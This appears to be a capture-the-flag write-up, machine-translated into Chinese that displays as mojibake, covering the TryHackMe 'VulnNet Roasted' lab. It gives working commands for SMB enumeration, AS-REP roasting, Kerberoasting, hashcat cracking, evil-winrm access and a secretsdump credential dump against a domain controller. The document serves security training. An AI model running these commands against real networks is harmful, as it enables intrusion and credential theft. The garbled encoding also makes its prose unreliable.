<html>
<head>
<title>THM Writeup: VulnNet Roasted</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THMæŠ¥é“:VulnNetçƒ˜ç„™</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/thm-writeup-vulnnet-roasted-8f4e18314ca7?source=collection_archive---------0-----------------------#2022-04-15">https://infosecwriteups.com/thm-writeup-vulnnet-roasted-8f4e18314ca7?source=collection_archive---------0-----------------------#2022-04-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/e302cf0a0f8fa17c3899a0e054048193.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/0*rEWS4csERhz1pl9d.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://tryhackme-images.s3.amazonaws.com/room-icons/ef0d67108825cb45ab4f5644299de169.png" rel="noopener ugc nofollow" target="_blank">æŒ‘æˆ˜å½¢è±¡ã€‚</a></figcaption></figure><p id="e8cc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘é€šè¿‡æšä¸¾è¿è¡Œåœ¨å¼€æ”¾ç«¯å£ä¸Šçš„æœåŠ¡å’Œåˆ©ç”¨Kerberosç‰¹æ€§æ¥æå‡æˆ‘çš„æƒé™ï¼Œé€æ­¥å®Œæˆäº†åˆ©ç”¨åŸŸæ§åˆ¶å™¨çš„è¿‡ç¨‹ã€‚è¿™ä¸ªæŒ‘æˆ˜åœ¨TryHackMeå¹³å°ä¸Šæœ‰ï¼Œé¢˜ç›®æ˜¯â€œ<strong class="kb ir">VulnNet baked</strong>ï¼Œç”±ç”¨æˆ·â€œ<em class="kx"> SkyWaves </em>åˆ›å»ºã€‚</p></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="ef53" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">æ”¾å¼ƒ</h1><p id="9867" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰<strong class="kb ir">å‰§é€</strong> <strong class="kb ir">ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†å›æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼</strong></p></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="3565" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">æŒ‘æˆ˜æè¿°</h1><blockquote class="mi mj mk"><p id="639e" class="jz ka kx kb b kc kd ke kf kg kh ki kj ml kl km kn mm kp kq kr mn kt ku kv kw ij bi translated">VulnNet Entertainmentåˆšåˆšä¸æ–°é›‡ä½£çš„ç³»ç»Ÿç®¡ç†å‘˜ä¸€èµ·åœ¨ä»–ä»¬çš„ç½‘ç»œä¸Šéƒ¨ç½²äº†ä¸€ä¸ªæ–°å®ä¾‹ã€‚ä½œä¸ºä¸€å®¶æœ‰å®‰å…¨æ„è¯†çš„å…¬å¸ï¼Œä»–ä»¬ä¸€å¦‚æ—¢å¾€åœ°é›‡ä½£ä½ è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå¹¶è§‚å¯Ÿç³»ç»Ÿç®¡ç†å‘˜çš„è¡¨ç°ã€‚</p></blockquote></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="292a" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">ç«¯å£æšä¸¾</h1><p id="ff96" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">æˆ‘å¼€å§‹é€šè¿‡ç”¨<strong class="kb ir"> NMAP </strong>æ‰§è¡Œå¿«é€Ÿæ‰«ææ¥æšä¸¾ç›®æ ‡æœºå™¨ï¼Œä»¥è¯†åˆ«ä»»ä½•æ‰“å¼€çš„ç«¯å£ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="378f" class="mx lg iq mt b gy my mz l na nb">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -Pn -oN all-ports-nmap-report 10.10.114.63</span><span id="31f8" class="mx lg iq mt b gy nc mz l na nb">PORT      STATE SERVICE          REASON<br/>53/tcp    open  domain           syn-ack ttl 125<br/>88/tcp    open  kerberos-sec     syn-ack ttl 125<br/>135/tcp   open  msrpc            syn-ack ttl 125<br/>139/tcp   open  netbios-ssn      syn-ack ttl 125<br/>389/tcp   open  ldap             syn-ack ttl 125<br/>445/tcp   open  microsoft-ds     syn-ack ttl 125<br/>464/tcp   open  kpasswd5         syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap   syn-ack ttl 125<br/>3268/tcp  open  globalcatLDAP    syn-ack ttl 125<br/>3269/tcp  open  globalcatLDAPssl syn-ack ttl 125<br/>5985/tcp  open  wsman            syn-ack ttl 125<br/>49665/tcp open  unknown          syn-ack ttl 125<br/>49668/tcp open  unknown          syn-ack ttl 125<br/>49670/tcp open  unknown          syn-ack ttl 125<br/>49672/tcp open  unknown          syn-ack ttl 125<br/>49680/tcp open  unknown          syn-ack ttl 125<br/>49713/tcp open  unknown          syn-ack ttl 125</span></pre><p id="200e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æŸ¥çœ‹è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æœ‰17ä¸ªç«¯å£æ‰“å¼€ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ¥è¯†åˆ«æ¯ä¸ªç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œå¹¶ä½¿ç”¨é€šç”¨çš„NSEè„šæœ¬æ¥æŸ¥æ‰¾æˆ‘å¯ä»¥åˆ©ç”¨çš„ä»»ä½•å¸¸è§æ¼æ´ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="d7de" class="mx lg iq mt b gy my mz l na nb">nmap -sV -sC -Pn -v -oN nmap-report -p 53,88,135,139,389,445,464,593,3268,3269,5985,49665,49668,49670,49672,49680,49713 10.10.197.14</span></pre><p id="dd08" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°NMAPçš„å¤§é‡è¾“å‡ºå’Œä¸€äº›æœ‰è¶£çš„æœåŠ¡ï¼Œæˆ‘å¯ä»¥è¿›ä¸€æ­¥åˆ—ä¸¾ã€‚</p></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="e3c4" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">SMBæšä¸¾</h1><p id="f3c3" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ç«¯å£139å’Œ445æ˜¯æ‰“å¼€çš„ã€‚ä½¿ç”¨<strong class="kb ir"> smbclient </strong>ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°åŒ¿åè®¿é—®è¢«å¯ç”¨ï¼Œå…è®¸æˆ‘åˆ—å‡ºç›®æ ‡æœºå™¨ä¸Šçš„å…±äº«è®¾ç½®ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="8a05" class="mx lg iq mt b gy my mz l na nb">smbclient -L //10.10.222.122 -N</span><span id="e67d" class="mx lg iq mt b gy nc mz l na nb">Sharename       Type      Comment<br/>---------       ----      -------<br/>ADMIN$          Disk      Remote Admin<br/>C$              Disk      Default share<br/>IPC$            IPC       Remote IPC<br/>NETLOGON        Disk      Logon server share <br/>SYSVOL          Disk      Logon server share <br/>VulnNet-Business-Anonymous Disk      VulnNet Business Sharing<br/>VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing</span></pre><p id="7946" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ä½¿ç”¨smbclientï¼Œæˆ‘å¼€å§‹æ£€æŸ¥æˆ‘å¯ä»¥è®¿é—®å“ªäº›å…±äº«ã€‚æˆ‘å‘ç°<strong class="kb ir"> IPC$ </strong>å…±äº«æ˜¯å¯è®¿é—®çš„ï¼Œè¿™è¡¨æ˜æˆ‘å¯ä»¥ç”¨<strong class="kb ir"> crackmapexec </strong>æ‰§è¡Œç”¨æˆ·æšä¸¾ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="1ffa" class="mx lg iq mt b gy my mz l na nb">crackmapexec smb 10.10.222.122 -u 'guest' -p '' --rid-brute</span></pre><p id="d1f5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ä½¿ç”¨<strong class="kb ir"> crackmapexec </strong>ï¼Œæˆ‘èƒ½å¤Ÿæšä¸¾ç›®æ ‡æœºå™¨ä¸Šè®¾ç½®çš„ç”¨æˆ·å¸æˆ·åˆ—è¡¨ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="c942" class="mx lg iq mt b gy my mz l na nb">Administrator<br/>Guest<br/>krbtgt<br/>WIN-2BO8M1OE1M1$<br/>enterprise-core-vn<br/>a-whitehat<br/>t-skid<br/>j-goldenhand<br/>j-leet</span></pre><p id="d175" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘æ£€æŸ¥äº†<strong class="kb ir">VulnNet-Business-Anonymous</strong>å’Œ<strong class="kb ir">VulnNet-Enterprise-Anonymous</strong>å…±äº«ï¼Œå‘ç°äº†å¤šä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="4161" class="mx lg iq mt b gy my mz l na nb">smbclient //10.10.197.14/VulnNet-Business-Anonymous -N<br/><br/>smb: \&gt; ls<br/><br/>  Business-Manager.txt         A      758  Fri Mar 12 01:24:34 2021<br/>  Business-Sections.txt        A      654  Fri Mar 12 01:24:34 2021<br/>  Business-Tracking.txt        A      471  Fri Mar 12 01:24:34 2021<br/></span><span id="f00b" class="mx lg iq mt b gy nc mz l na nb">smbclient //10.10.197.14/VulnNet-Enterprise-Anonymous -N<br/><br/>smb: \&gt; ls<br/><br/>  Enterprise-Operations.txt    A      467  Fri Mar 12 01:24:34 2021<br/>  Enterprise-Safety.txt        A      503  Fri Mar 12 01:24:34 2021<br/>  Enterprise-Sync.txt          A      496  Fri Mar 12 01:24:34 2021</span></pre><p id="890e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™äº›æ–‡ä»¶åŒ…å«ä¸ºè¯¥ç»„ç»‡å·¥ä½œçš„ä¸åŒå‘˜å·¥çš„å§“åï¼Œå¹¶ç¡®è®¤ä¹‹å‰å‘ç°çš„ç”¨æˆ·å¸æˆ·æ˜¯æœ‰æ•ˆçš„ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="ac71" class="mx lg iq mt b gy my mz l na nb">Alexa Whitehat      (i.e. a-whitehat)<br/>Jack Goldenhand     (i.e. j-goldenhand)<br/>Tony Skid           (i.e. t-skid)<br/>Johnny Leet         (i.e. j-leet)</span></pre></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="fafb" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">Kerberoså¼€å‘</h1><p id="f20b" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">ç°åœ¨æˆ‘æœ‰äº†ä¸€äº›æ½œåœ¨çš„ç”¨æˆ·åï¼Œæˆ‘å¼€å§‹å¯»æ‰¾å‘ç°è¿™äº›å¸æˆ·å‡­è¯çš„æ–¹æ³•ã€‚åœ¨æˆ‘ä»¬ä¹‹å‰çš„NMAPæ‰«æä¸­ï¼Œæˆ‘çœ‹åˆ°Kerberosåœ¨ç«¯å£88ä¸Šè¿è¡Œï¼Œç”±äºæˆ¿é—´çš„æ ‡é¢˜å¾ˆå¤§ç¨‹åº¦ä¸Šæš—ç¤ºäº†Kerberosè®¤è¯ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„èµ·ç‚¹ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="53ba" class="mx lg iq mt b gy my mz l na nb">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-03 10:33:32Z)</span></pre><h2 id="febf" class="mx lg iq bd lh nd ne dn ll nf ng dp lp kk nh ni lt ko nj nk lx ks nl nm mb nn bi translated">asé‡æ–°å‘å¸ƒ</h2><p id="d1ed" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">å½“ç”¨æˆ·å¸æˆ·æ‹¥æœ‰ç‰¹æƒâ€œ<em class="kx">ä¸éœ€è¦é¢„è®¤è¯</em>â€é›†æ—¶ï¼Œä¼šå‘ç”Ÿé‡æ–°å‘å¸ƒã€‚è¿™æ„å‘³ç€åœ¨è¯·æ±‚æŒ‡å®šç”¨æˆ·å¸æˆ·ä¸Šçš„Kerberosç¥¨è¯ä¹‹å‰ï¼Œå¸æˆ·ä¸éœ€è¦æä¾›æœ‰æ•ˆçš„èº«ä»½è¯æ˜ã€‚</p><p id="f4b3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘ä»¬å¯ä»¥åœ¨<a class="ae jy" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank"> Impacket </a>ä¸­ä½¿ç”¨ä¸€ä¸ªåä¸ºâ€œ<strong class="kb ir"> GetNPUsers.py </strong>çš„å·¥å…·æ¥æ£€ç´¢Kerberosç¥¨æ®ã€‚è¿™å…è®¸æˆ‘ä»¬ä»å¯†é’¥åˆ†å‘ä¸­å¿ƒæŸ¥è¯¢å¯æ¢å¤çš„å¸æˆ·ã€‚æŸ¥è¯¢å¸æˆ·å”¯ä¸€éœ€è¦çš„æ˜¯ä¸€ç»„æœ‰æ•ˆçš„ç”¨æˆ·åï¼Œæˆ‘ä»¬ä¹‹å‰åœ¨SMBæšä¸¾ä¸­å·²ç»åˆ—ä¸¾è¿‡äº†ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="4016" class="mx lg iq mt b gy my mz l na nb">python3 GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.222.122 -usersfile userlist -no-pass -request -outputfile kerberos-users-found</span></pre><p id="b352" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿è¡Œâ€œGetNPUsers.pyâ€åï¼Œæˆ‘çœ‹åˆ°å¯ä»¥ä»<strong class="kb ir"> t-skid </strong>ç”¨æˆ·è´¦å·æŸ¥è¯¢ä¸€å¼ æ²¡æœ‰å¯†ç çš„ç¥¨ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="816e" class="mx lg iq mt b gy my mz l na nb">$krb5asrep$23$<strong class="mt ir">t-skid</strong>@VULNNET-RST.LOCAL:6ba0665d5efd839cae9593ef6825e36a$1e89ab87b72c3f1ac5e979b26f7b71bef98bef016ae7087758edb0b7fee96c2d1e02c1cc2565713476b955b085f6cbfb96ee7229e0ba6343ffda44d615af7a1768f59e07d77b957f68f3da1a07fcd3a874f2518123691524f3be3fa195b8e1428bdc4322c152c342ba8b7de80d455ba53f611e132dae11ad5833db482d8526ddeb5ac09533391f7b3828bdfd90f8447278618dcabfe64a15d0a708547f46537df8632e603b214e3e4f038a4929283b35742f88af89f13615e7cedfd1b83ea73ecb95a41f6c4edf32fbae23eaaf5c018efcc694393272c1f04a835551b0b358344b0564b702971ac298e76fa2c7a7f21add1cd13f48b7</span></pre><p id="5001" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong class="kb ir"> hashcat </strong>æ¥ç ´è§£ä»KDCä¸­æ£€ç´¢åˆ°çš„â€œ<em class="kx"> Kerberos 5 AS-REP type 23 </em>â€å“ˆå¸Œã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="a74a" class="mx lg iq mt b gy my mz l na nb">hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt -o cracked.txt</span><span id="1e42" class="mx lg iq mt b gy nc mz l na nb">&lt;hash&gt;:tj07*****</span></pre><h2 id="5308" class="mx lg iq bd lh nd ne dn ll nf ng dp lp kk nh ni lt ko nj nk lx ks nl nm mb nn bi translated">Kerberoasting</h2><p id="db93" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">ç°åœ¨æˆ‘æœ‰äº†ä¸€ç»„æ ‡å‡†ç”¨æˆ·å‡­è¯ï¼Œæˆ‘å¼€å§‹å¯»æ‰¾æ”¯æŒçš„<strong class="kb ir">æœåŠ¡ä¸»ä½“åç§°(SPN)</strong>ï¼Œå¹¶ä½¿ç”¨Impacketä¸­çš„"<strong class="kb ir"> GetUserSPNs </strong>"å·¥å…·ä¸ºSPNè·å–<strong class="kb ir">ç¥¨æ®æˆäºˆæœåŠ¡(TGS) </strong>ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="9248" class="mx lg iq mt b gy my mz l na nb">python3 GetUserSPNs.py vulnnet-rst.local/t-skid:tj0******* -dc-ip 10.10.5.146 -request</span></pre><p id="0521" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™æ˜¯æˆåŠŸçš„ï¼Œæˆ‘èƒ½å¤Ÿæ£€ç´¢ç”¨æˆ·<strong class="kb ir"> enterprise-core-vn </strong>çš„TGSæ•£åˆ—ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="df97" class="mx lg iq mt b gy my mz l na nb">$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$6abf4cc44a39bdcd4105132ce2de79e2$94ceaec59d8fd2d6fc7e78163f5dec76f9d3d7d36f3ba72611c13023d17b1f58beb790bd1b8059235768103a637044b078084ccec48d415bf4c663bfd149f30f83e0478dbfa3c9533bca86bdb904fc8241fa66afd97f377c5e2e0113db73e2717435076243a9474c8b417b888d0de8eaa945119c9fa3613391b3ecf4226c1e94daadaa14dadfc3aae24047f1a828ef853322cec2b40afc43afc0f17832512ac671575525e95af19c1a7fae625f1c1be49caa84f927c84a39464387cb448caa738a75ac31a2c29f912faeaefa2091daf9182eb8551f06dc5160df89dd445e9c74127070827233af07d58df6a759727ccef8b8acb9982af7857d262f768dc330e4eea21e9e1c575ba90a7dca7d4be17fdc8c1c1c9d3603d877b022887e483f63538f5b794d32c4e7708fa8ed8b35e2aae0fd0f762acd690d44be1b142507142fa654aeda87906bdfc8ba6b81dbe6dc1be8d1331ea178e3a5f739eb2eb35207f946c91471e7a75c11616029b85d36ad2ed9c6135090bcb32416b81da0305bfa9c8a905c29a6ca3759ede8f96f18be22652d287b64ce6d7447b75d63136511c913930b9e1962cede06fde63001a7b70e3d16909a429a73c30f5e751c99c1d17a4521ac5aa1eaffa6746de8accb8312996689b86cfb94a898d066602e68512f865229511549eb30dbac994b543e1977b9105d19e0fef3982c4d7a71ae86d69429c9c19f2f330140cdf30e5231a82537626879950f988a074572c9273b2117c0c4497cab2f97b72aef6ef05658b9968bfffb91c21a7245e1a3b80f40f7177acd5d1062bc62d21c2874f62bd3cb4e48226037941c354a0017cec4434de5ccfd0791eed3fd4ed20f8e64c4b702bbb32526cf110e9f62a77c51d7f0607b9634b6b468fd864de6e440ae88d00b6c0381f1df8d17c53493ac66234e0f2195f83883e0bd015e0e26d324881c8674cdc7cf5e9c8ae72a95ff1fc72ddb4a14bbea1cd378c234350c97b638cd2e048f0b6c90df243d0fb3f9837d7baab629be6e6151a2c5bb366efb672b13884d071be58233768f4bf37bab374691af67cf0de44b92a182f5676e41ec44c56bb69419205523aad19cc9e5eae7401bebb2d694314d6118ef0fafde6c44c9e92c590e897bd8788cff0cf5b2184bcb284a7b78be8800fc46274296c1824c6a83da9f4e50f5f7f678a732d6ba3a55e14cad912ca53aa25eb9f3f327a1d4c22dccf26f37b9cc221fae2f36e3eba0722cf07570384fcb721b6762e6c7603ac0861755a59e5e52e2714fc0d9270e88e7c9629db8ae7027f8b23c0650d725d4153b5eb32395f1f56afad711bf691740ff5b554648a0553d2c66474b53129f7f26a581c4f339bb079f7770c5c3ced0f3f4615f3a535b81e26c26f385</span></pre><p id="cd06" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘ç°åœ¨å¯ä»¥ä½¿ç”¨<strong class="kb ir"> hashcat </strong>æ¥æ£€ç´¢è¿™ä¸ªç”¨æˆ·å¸æˆ·çš„å¯†ç ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="e9df" class="mx lg iq mt b gy my mz l na nb">hashcat64.exe -m 13100 hash.txt rockyou.txt</span></pre><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="np nq di nr bf ns"><div class="gh gi no"><img src="../Images/4327da6400ea6250e06161316d6e408f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YD24T65ozXtNDKxIjorZcg.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">Kerberos TGSå“ˆå¸Œå¯†ç ã€‚</figcaption></figure><p id="86af" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æœ‰äº†è¿™ç»„æ–°çš„å‡­è¯ï¼Œæˆ‘å°±èƒ½å¤Ÿä½¿ç”¨<strong class="kb ir"> evil-winrm </strong>ç™»å½•å¹¶æ£€ç´¢ç”¨æˆ·æ ‡å¿—ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="5c5f" class="mx lg iq mt b gy my mz l na nb">evil-winrm -u 'enterprise-core-vn' -p '*******' -i 10.10.128.52 -N</span></pre><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="np nq di nr bf ns"><div class="gh gi nt"><img src="../Images/c5bb18524c3fc40693e92901fd4ecafa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3nYKYhPnEiOdFL7enEt4yA.png"/></div></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated">ç”¨æˆ·æ ‡å¿—ã€‚</figcaption></figure></div><div class="ab cl ky kz hu la" role="separator"><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld le"/><span class="lb bw bk lc ld"/></div><div class="ij ik il im in"><h1 id="a4d1" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">æƒé™æå‡</h1><p id="4838" class="pw-post-body-paragraph jz ka iq kb b kc md ke kf kg me ki kj kk mf km kn ko mg kq kr ks mh ku kv kw ij bi translated">æˆ‘å¼€å§‹ä½¿ç”¨æˆ‘æ–°åˆ›å»ºçš„è¿œç¨‹shellåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä¸€äº›æ‰‹åŠ¨æšä¸¾ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰å‘ç°ä»»ä½•å¯ä»¥åˆ©ç”¨çš„windowsç‰¹æƒã€‚æˆ‘å†³å®šå›å¤´å¯¹NMAPç¡®å®šçš„æœåŠ¡è¿›è¡Œä¸€äº›è¿›ä¸€æ­¥çš„åˆ—ä¸¾ã€‚ä»¥å‰ï¼Œæˆ‘æ— æ³•ä½¿ç”¨åŒ¿åç™»å½•è®¿é—®ä¸€äº›SMBå…±äº«ã€‚æˆ‘ä½¿ç”¨<strong class="kb ir"> enterprise-core-vn </strong>å¸æˆ·å‡­è¯å†æ¬¡æšä¸¾SMBå…±äº«ï¼Œå‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„VBSæ–‡ä»¶ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="d755" class="mx lg iq mt b gy my mz l na nb">smbclient //10.10.128.52/SYSVOL -U enterprise-core-vn<br/> <br/>smb: \&gt; cd vulnnet-rst.local\scripts\<br/>smb: \vulnnet-rst.local\scripts\&gt; ls<br/><br/>  ResetPassword.vbs           A     2821  Tue Mar 16 23:18:14 2021</span><span id="8296" class="mx lg iq mt b gy nc mz l na nb">smb: \vulnnet-rst.local\scripts\&gt; get ResetPassword.vbs</span></pre><p id="774c" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">å›é¡¾VBSè„šæœ¬ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ç”¨æˆ·å¸æˆ·çš„å‡­è¯ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="790e" class="mx lg iq mt b gy my mz l na nb">strUserNTName = "a-whitehat"<br/>strPassword = "bNdKVkj******"</span></pre><p id="48a2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘å°è¯•ä½¿ç”¨evil-winrmï¼Œä½†æ˜¯a-whitehatç”¨æˆ·å¸æˆ·æ²¡æœ‰å¿…è¦çš„æƒé™ã€‚æˆ‘å°è¯•æšä¸¾SMBå…±äº«ï¼Œå‘ç°æˆ‘å¯¹è¿™äº›å…±äº«å…·æœ‰è¯»/å†™æƒé™ï¼ŒåŒ…æ‹¬<strong class="kb ir"> ADMIN$ </strong>å…±äº«ã€‚æˆ‘å†³å®šä½¿ç”¨â€œ<strong class="kb ir"> secretsdump.py </strong>â€ä¸ºDCæœºå™¨ä¸Šçš„æ‰€æœ‰ç”¨æˆ·è½¬å‚¨NTLMæ•£åˆ—ã€‚</p><pre class="mo mp mq mr gt ms mt mu mv aw mw bi"><span id="e165" class="mx lg iq mt b gy my mz l na nb">python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKV***** @10.10.128.52</span><span id="656d" class="mx lg iq mt b gy nc mz l na nb">[*] Service RemoteRegistry is in stopped state<br/>[*] Starting service RemoteRegistry<br/>[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a<br/>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br/><strong class="mt ir">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747a******************:::</strong></span></pre><p id="153e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘èƒ½å¤Ÿè·å¾—ç®¡ç†å‘˜å¸æˆ·çš„æ•£åˆ—ï¼Œå¹¶ä½¿ç”¨evil-winrmç™»å½•å¹¶è·å¾—æ ¹æ 